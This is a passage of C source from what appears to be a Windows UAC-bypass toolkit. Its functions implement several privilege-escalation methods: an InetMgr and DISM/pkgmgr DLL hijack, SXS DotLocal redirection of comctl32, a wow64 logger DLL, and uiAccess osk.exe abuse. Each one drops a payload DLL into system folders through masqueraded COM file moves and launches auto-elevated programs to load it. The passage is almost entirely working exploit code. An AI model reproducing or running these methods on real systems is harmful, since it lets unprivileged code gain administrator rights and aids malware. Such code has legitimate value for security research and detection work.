        if (ft == ftUnknown)
            break;

        switch (ft) {

        case ftMZ: //win7            
            bSuccess = ProcessFileMZ(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
            break;

        case ftDCN://win8     
            bSuccess = ProcessFileDCN(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
            break;

        case ftDCS://win10   

            if (InitCabinetDecompressionAPI()) {
                bSuccess = ProcessFileDCS(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
            }
            break;

        default:
            break;

        }

        //is there any error processing files from winsxs?
        if (!bSuccess)
            break;

        RtlSecureZeroMemory(&textbuf, sizeof(textbuf));
        _strcpy(textbuf, g_ctx.szTempDirectory);
        _strcat(textbuf, INETMGR_EXE);

        bSuccess = supWriteBufferToFile(textbuf, OutputBuffer, (DWORD)OutputBufferSize);
        if (!bSuccess)
            break;

        RtlSecureZeroMemory(&szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);
        _strcat(szDest, INETSRV_DIR);
        bSuccess = ucmMasqueradedMoveFileCOM(textbuf, szDest);
        if (!bSuccess)
            break;

        _strcpy(textbuf, g_ctx.szTempDirectory);
        _strcat(textbuf, MSCOREE_DLL);
        bSuccess = supWriteBufferToFile(textbuf, ProxyDll, ProxyDllSize);
        if (!bSuccess)
            break;

        bSuccess = ucmMasqueradedMoveFileCOM(textbuf, szDest);
        if (!bSuccess)
            break;

        _strcat(szDest, INETMGR_EXE);
        bSuccess = supRunProcess(szDest, NULL);

    } while (bCond);


    if (MappedFile != NULL)
        UnmapViewOfFile(MappedFile);

    if (hFileMapping != NULL)
        CloseHandle(hFileMapping);

    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);

    if (OutputBuffer != NULL)
        supHeapFree(OutputBuffer);

    return bSuccess;
}

typedef BOOL(CALLBACK *UCMX_FIND_FILE_CALLBACK)(
    WIN32_FIND_DATA *fdata,
    LPWSTR lpDirectory,
    PVOID ProxyDll,
    DWORD ProxyDllSize);

/*
* ucmxScanFiles
*
* Purpose:
*
* Find files of the given type and run callback over them.
*
*/
BOOL ucmxScanFiles(
    _In_ LPWSTR lpDirectory,
    _In_ LPWSTR lpFileType,
    _In_ UCMX_FIND_FILE_CALLBACK Callback,
    _In_opt_ PVOID ProxyDll,
    _In_opt_ DWORD ProxyDllSize
)
{
    BOOL bStopEnumeration = FALSE;
    HANDLE hFile;
    WCHAR textbuf[MAX_PATH * 2];
    WIN32_FIND_DATA fdata;

    if ((Callback == NULL) || (lpDirectory == NULL) || (lpFileType == NULL))
        return FALSE;

    RtlSecureZeroMemory(textbuf, sizeof(textbuf));

    _strncpy(textbuf, MAX_PATH, lpDirectory, MAX_PATH);
    _strcat(textbuf, L"\\");
    _strncpy(_strend(textbuf), 20, lpFileType, 20);

    RtlSecureZeroMemory(&fdata, sizeof(fdata));
    hFile = FindFirstFile(textbuf, &fdata);
    if (hFile != INVALID_HANDLE_VALUE) {
        do {

            bStopEnumeration = Callback(&fdata, lpDirectory, ProxyDll, ProxyDllSize);
            if (bStopEnumeration)
                break;

        } while (FindNextFile(hFile, &fdata));
        FindClose(hFile);
    }
    return bStopEnumeration;
}

/*
* ucmInetMgrMethod
*
* Purpose:
*
* Since Windows 10 TH2 appinfo whitelist with full path two applications, which they were unable to redesign/move.
* Sysprep.exe and inetmgr.exe (IIS). This was made in a favor of the UAC fix where was fixed
* WinSAT concept method, when you can copy autoelevated executables within windows folders to do all
* required preparations for dll hijack. However InetMgr.exe does not exist in default windows setup.
* This component installed only if user choose to install IIS which most of people don't use at all.
* InetMgr component sits in winsxs folder (packed in win8+). We will simple use it (expand if needed) and abuse dll hijack
* as always directly with their hardcoded "safe" file path.
*
*/
BOOL ucmInetMgrMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE, bCond = FALSE;
    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szDirBuf[MAX_PATH * 2];
    HANDLE hFindFile;
    WIN32_FIND_DATA fdata;

    do {

        //target dir
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szSystemDirectory);
        _strcat(szBuffer, INETSRV_DIR);
        _strcat(szBuffer, INETMGR_EXE);

        //File already exist, so IIS could be installed
        if (PathFileExists(szBuffer)) {
            supDebugPrint(TEXT("ucmInetMgrMethod"), ERROR_ALREADY_EXISTS);
            break;
        }

        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szBuffer, L"\\winsxs\\");

        _strcpy(szDirBuf, szBuffer);
        _strcat(szBuffer, L"*");

        RtlSecureZeroMemory(&fdata, sizeof(fdata));
        hFindFile = FindFirstFile(szBuffer, &fdata);
        if (hFindFile != INVALID_HANDLE_VALUE) {

            do {

                if ((fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                    (fdata.cFileName[0] != L'.')
                    )
                {
                    if (_strstri(fdata.cFileName, INETMGR_SXS) != NULL) {

                        _strcpy(szBuffer, szDirBuf);
                        _strcat(szBuffer, fdata.cFileName);

                        bResult = ucmxScanFiles(
                            szBuffer,
                            L"*.exe",
                            (UCMX_FIND_FILE_CALLBACK)&ucmInetMgrFindCallback,
                            ProxyDll,
                            ProxyDllSize);

                        if (bResult)
                            break;

                    }
                }

            } while (FindNextFile(hFindFile, &fdata));

            FindClose(hFindFile);
        }

    } while (bCond);

    return bResult;
}

/*
* ucmSetupAkagiLink
*
* Purpose:
*
* Give Ikazuchi proper key to work with.
*
*/
BOOL ucmSetupAkagiLink(
    VOID
)
{
    BOOL bCond = FALSE, bResult = FALSE;
    HANDLE hRoot = NULL, hChild = NULL;
    LPWSTR lpUser;
    NTSTATUS status;
    UNICODE_STRING ChildName, ParentRoot, usKey;
    OBJECT_ATTRIBUTES attr;

    RtlSecureZeroMemory(&usKey, sizeof(usKey));

    do {
        status = RtlFormatCurrentUserKeyPath(&usKey);
        if (!NT_SUCCESS(status))
            break;

        lpUser = _filename(usKey.Buffer);

        ParentRoot.Buffer = NULL;
        ParentRoot.Length = 0;
        ParentRoot.MaximumLength = 0;
        RtlInitUnicodeString(&ParentRoot, L"\\Rpc Control\\Akagi");
        InitializeObjectAttributes(&attr, &ParentRoot, OBJ_CASE_INSENSITIVE, 0, NULL);
        status = NtCreateDirectoryObject(&hRoot, DIRECTORY_CREATE_SUBDIRECTORY, &attr);
        if (!NT_SUCCESS(status))
            break;

        ChildName.Buffer = NULL;
        ChildName.Length = 0;
        ChildName.MaximumLength = 0;
        RtlInitUnicodeString(&ChildName, lpUser);
        attr.RootDirectory = hRoot;
        attr.ObjectName = &ChildName;
        status = NtCreateDirectoryObject(&hChild, DIRECTORY_ALL_ACCESS, &attr);
        if (!NT_SUCCESS(status))
            break;

        bResult = TRUE;

    } while (bCond);

    //
    // Cleanup created objects if something went wrong.
    // Otherwise objects will die together with process at exit.
    //
    if (bResult == FALSE) {
        if (hRoot) {
            NtClose(hRoot);
        }
        if (hChild) {
            NtClose(hChild);
        }
    }

    if (usKey.Buffer) {
        RtlFreeUnicodeString(&usKey);
    }
    return bResult;
}

/*
* ucmSXSMethod
*
* Purpose:
*
* Exploit SXS Local Redirect feature.
*
* SXS/Fusion uses dll redirection, attempting to load internal manifest dependencies from
* non existent directory (this is so called DotLocal dll redirection), it is trying to do this
* before going to WinSXS store.
*
* In this case dependency is Microsoft.Windows.Common-Controls.
*
* Maybe you think it is handy cool feature, but I think its another backdoor from lazy dotnet crew.
* "You keep shipping crap, and crap, and more crap".
*
*/
BOOL ucmSXSMethod(
    PVOID ProxyDll,
    DWORD ProxyDllSize,
    LPWSTR lpTargetDirectory, //single element in system32 with slash at end
    LPWSTR lpTargetApplication, //executable name
    LPWSTR lpLaunchApplication, //executable name, must be in same dir as lpTargetApplication
    BOOL bConsentItself
)
{
    BOOL     bCond = FALSE, bResult = FALSE;
    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
    SIZE_T   sz;
    LPWSTR   lpSxsPath = NULL;

    WCHAR szSrc[MAX_PATH * 2], szDst[MAX_PATH * 2];

    SXS_SEARCH_CONTEXT sctx;

    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
        return bResult;

    if (lpTargetApplication == NULL)
        return bResult;

    if (_strlen(lpTargetApplication) > MAX_PATH)
        return bResult;

    do {
        //common part, locate sxs dll, drop payload to temp
        RtlSecureZeroMemory(szSrc, sizeof(szSrc));
        RtlSecureZeroMemory(szDst, sizeof(szDst));

        sz = UNICODE_STRING_MAX_BYTES;
        NtAllocateVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (lpszFullDllPath == NULL)
            break;

        sctx.DllName = COMCTL32_DLL;
        sctx.PartialPath = COMCTL32_SXS;
        sctx.FullDllPath = lpszFullDllPath;

        if (!NT_SUCCESS(LdrEnumerateLoadedModules(0, &sxsFindDllCallback, (PVOID)&sctx)))
            break;

        lpszDirectoryName = _filename(lpszFullDllPath);
        if (lpszDirectoryName == NULL)
            break;

        sz = 0x1000 + (_strlen(lpszDirectoryName) * sizeof(WCHAR));
        NtAllocateVirtualMemory(NtCurrentProcess(), &lpSxsPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (lpSxsPath == NULL)
            break;

        //drop payload dll
        _strcpy(szSrc, g_ctx.szTempDirectory);
        _strcat(szSrc, COMCTL32_DLL);

        bResult = supWriteBufferToFile(szSrc, ProxyDll, ProxyDllSize);
        if (!bResult)
            break;

        _strcpy(lpSxsPath, g_ctx.szSystemDirectory);
        if (lpTargetDirectory) {
            _strcat(lpSxsPath, lpTargetDirectory);
        }
        _strcpy(szDst, lpTargetApplication);

        //
        // Workaround for consent, so it won't ban itself.
        // Create all files and target directories with fake root name.
        // Next when all fileop is done, rename fake root to real.
        //
        if (bConsentItself) {
            _strcat(szDst, FAKE_LOCAL_SXS);
        }
        else {
            _strcat(szDst, LOCAL_SXS);
        }

        //create local directory
        if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, szDst))
            break;

        //create assembly directory
        _strcat(lpSxsPath, szDst);
        if (!ucmMasqueradedCreateSubDirectoryCOM(lpSxsPath, lpszDirectoryName))
            break;

        //move payload file
        _strcat(lpSxsPath, TEXT("\\"));
        _strcat(lpSxsPath, lpszDirectoryName);
        if (!ucmMasqueradedMoveFileCOM(szSrc, lpSxsPath))
            break;

        //
        // Consent workaround end. 
        // Restore real directory name.
        //
        if (bConsentItself) {
            _strcpy(lpSxsPath, g_ctx.szSystemDirectory);
            if (lpTargetDirectory) {
                _strcat(lpSxsPath, lpTargetDirectory);
            }
            _strcat(lpSxsPath, lpTargetApplication);
            _strcat(lpSxsPath, FAKE_LOCAL_SXS);

            _strcpy(szDst, lpTargetApplication);
            _strcat(szDst, LOCAL_SXS);

            bResult = ucmMasqueradedRenameElementCOM(lpSxsPath, szDst);
            if (!bResult)
                break;

            //put a link to Ikazuchi, so she can find proper key.
            ucmSetupAkagiLink();
        }

        //run target process
        _strcpy(szDst, g_ctx.szSystemDirectory);
        if (lpTargetDirectory) {
            _strcat(szDst, lpTargetDirectory);
        }

        if (lpLaunchApplication) {
            _strcat(szDst, lpLaunchApplication);
        }
        else {
            _strcat(szDst, lpTargetApplication);
        }
        bResult = supRunProcess(szDst, NULL);
        Sleep(1000);

    } while (bCond);

    if (lpszFullDllPath) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
    }

    if (lpSxsPath) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
    }

    return bResult;
}

/*
* ucmDismMethod
*
* Purpose:
*
* Exploit DISM application dll loading scheme.
*
* Dism.exe located in system32 folder while it dlls are in system32\dism
* When loaded dism first attempt to load dlls from system32 folder.
*
* Trigger: pkgmgr.exe
* PkgMgr.exe is autoelevated whitelisted application which is actually just calling Dism.exe
*
*/
BOOL ucmDismMethod(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL    bCond = FALSE, bResult = FALSE;
    WCHAR   szSource[MAX_PATH * 2], szDest[MAX_PATH * 2];


    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
        return bResult;

    do {

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, DISMCORE_DLL);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        _strcpy(szDest, g_ctx.szSystemDirectory);
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest))
            break;

        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, PACKAGE_XML);

        //write package data to disk
        if (!supWriteBufferToFile(szSource, (PVOID)PackageData, sizeof(PackageData))) {
            break;
        }

        _strcpy(szDest, g_ctx.szSystemDirectory);
        _strcat(szDest, PKGMGR_EXE);

        bResult = supRunProcess(szDest, TEXT("/n:%temp%\\ellocnak.xml"));

    } while (bCond);

    return bResult;
}

/*
* ucmWow64LoggerMethod
*
* Purpose:
*
* Bypass UAC using wow64 logger dll and wow64 application.
*
* Trigger: 32bit version of wusa.exe
* Loader will map and call our logger dll during wow64 process initialization.
*
*/
BOOL ucmWow64LoggerMethod(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE;
    WCHAR szTarget[MAX_PATH * 2];

    //
    // Build target application full path.
    // We need autoelevated application from syswow64 folder ONLY.
    //
    _strcpy(szTarget, USER_SHARED_DATA->NtSystemRoot);
    _strcat(szTarget, SYSWOW64_DIR);
    _strcat(szTarget, WUSA_EXE);

    bResult = ucmGenericAutoelevation(szTarget, WOW64LOG_DLL, ProxyDll, ProxyDllSize);
    if (bResult) {
        //
        // Attempt to remove payload dll after execution.
        // Warning: every wow64 application will load payload code (some will crash).
        // Remove file IMMEDIATELY after work.
        //
        _strcpy(szTarget, g_ctx.szSystemDirectory);
        _strcat(szTarget, WOW64LOG_DLL);
        DeleteFile(szTarget);
    }
    return bResult;
}

/*
* ucmUiAccessMethod
*
* Purpose:
*
* Bypass UAC using uiAccess(true) application.
* Original method source
* https://habrahabr.ru/company/pm/blog/328008/
*
*/
BOOL ucmUiAccessMethod(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE, bCond = FALSE;
    SIZE_T Length;
    DWORD DllVirtualSize;
    LPWSTR lpEnv, lpTargetDll;
    PVOID EntryPoint, DllBase;
    PIMAGE_NT_HEADERS NtHeaders;
    UNICODE_STRING uStr;
    WCHAR szTarget[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];

    do {

        //
        // There is no osksupport.dll in Windows 7.
        //
        if (g_ctx.dwBuildNumber < 9200)
            lpTargetDll = DUSER_DLL;
        else
            lpTargetDll = OSKSUPPORT_DLL;

        //
        // Replace default Fubuki dll entry point with new.
        //
        NtHeaders = RtlImageNtHeader(ProxyDll);
        if (NtHeaders == NULL)
            break;

        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(ProxyDll, &DllVirtualSize);
        if (DllBase) {

            //
            // Get the new entrypoint.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, "_FubukiProc1");
            if (EntryPoint == NULL)
                break;

            //
            // Set new entrypoint and recalculate checksum.
            //
            NtHeaders->OptionalHeader.AddressOfEntryPoint =
                (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

            NtHeaders->OptionalHeader.CheckSum =
                supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);

            VirtualFree(DllBase, 0, MEM_RELEASE);

        }
        else
            break;

        //
        // Drop modified fubuki.dll to the %temp%
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpTargetDll);
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize))
            break;

        //
        // Build target path in g_lpIncludePFDirs
        //
        uStr.Buffer = NULL;
        uStr.Length = 0;
        uStr.MaximumLength = 0;
        lpEnv = L"ProgramFiles=";
        RtlInitUnicodeString(&uStr, lpEnv);

        lpEnv = supQueryEnvironmentVariableOffset(&uStr);
        if (lpEnv == NULL)
            break;

        Length = _strlen(lpEnv);
        if ((Length == 0) || (Length > MAX_PATH))
            break;

        RtlSecureZeroMemory(&szTarget, sizeof(szTarget));
        _strncpy(szTarget, MAX_PATH, lpEnv, MAX_PATH);
        _strcat(szTarget, TEXT("\\"));
        _strcat(szTarget, T_WINDOWSMEDIAPLAYER);
        _strcat(szTarget, TEXT("\\"));

        //
        // Copy Fubuki to target directory.
        // 
        if (!ucmMasqueradedMoveFileCOM(szSource, szTarget))
            break;

        //
        // Copy osk.exe to Program Files\Windows Media Player
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szSystemDirectory);
        _strcat(szSource, OSK_EXE);
        if (!ucmMasqueradedMoveCopyFileCOM(szSource, szTarget, FALSE))
            break;

        //
        // Run uiAccess osk.exe from Program Files.
        //
        _strcat(szTarget, OSK_EXE);
        if (supRunProcess2(szTarget, NULL, FALSE)) {
            //
            // Run eventvwr.exe as final trigger.
            // Spawns mmc.exe with eventvwr.msc snap-in.
            //
            _strcpy(szTarget, g_ctx.szSystemDirectory);
            _strcat(szTarget, EVENTVWR_EXE);
            bResult = supRunProcess2(szTarget, NULL, FALSE);
        }

    } while (bCond);

    return bResult;
}
